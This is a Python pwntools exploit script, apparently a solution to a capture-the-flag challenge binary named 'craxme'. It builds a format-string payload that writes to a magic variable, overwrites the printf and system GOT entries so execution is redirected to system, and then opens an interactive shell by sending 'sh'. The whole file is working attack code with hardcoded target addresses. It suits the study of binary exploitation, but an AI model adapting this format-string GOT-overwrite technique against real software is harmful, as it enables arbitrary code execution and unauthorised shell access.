#!/usr/bin/env python

from pwn import *
from fmtexp import FmtStrExp

r = process('./sample/craxme')

# Address setup
puts_got = 0x804a018
system_jmp = 0x8048416
system_got = 0x804a01c
printf_got = 0x804a010
main = 0x0804854b
magic = 0x0804a038

# FormatString object setup
magic_fmt = FmtStrExp(0, magic, 0xda)
printf_got_fmt = FmtStrExp(0, printf_got, system_jmp)
system_got_fmt = FmtStrExp(0, system_got, main)

# Generate payload
total_fmt = [(magic_fmt, 1), (printf_got_fmt, 4), (system_got_fmt, 4)]
superpayload = FmtStrExp.generate32(total_fmt, 7)
r.sendline(superpayload)

# Get shell
sleep(1)
r.sendline('sh\x00')

r.interactive()
